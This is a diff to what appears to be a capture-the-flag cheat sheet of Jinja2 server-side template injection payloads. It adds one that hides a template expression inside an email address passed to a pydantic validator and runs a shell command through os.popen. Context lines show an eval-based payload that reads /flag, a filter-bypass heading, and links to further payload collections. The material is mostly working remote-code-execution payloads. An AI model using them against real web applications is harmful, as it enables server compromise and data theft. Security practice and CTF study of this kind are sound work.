@@ -8,6 +8,12 @@
 {{().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__["eval"]("set(open('/flag'))")}}
 ```
 
+## pydantic email validator
+```py
+"{{cycler.__init__.__globals__['os'].popen('/getflag').read()}}" <a@a.com>
+```
+
+
 ## No dots, no attr, no |, no 'flag', no subclasses, no globals, no `__class__`, no mro
 
 ```py
@@ -41,3 +47,4 @@ Connection: close
 Other payloads: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---filter-bypass
 
 Forcing output on blind RCE: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---forcing-output-on-blind-rce
+
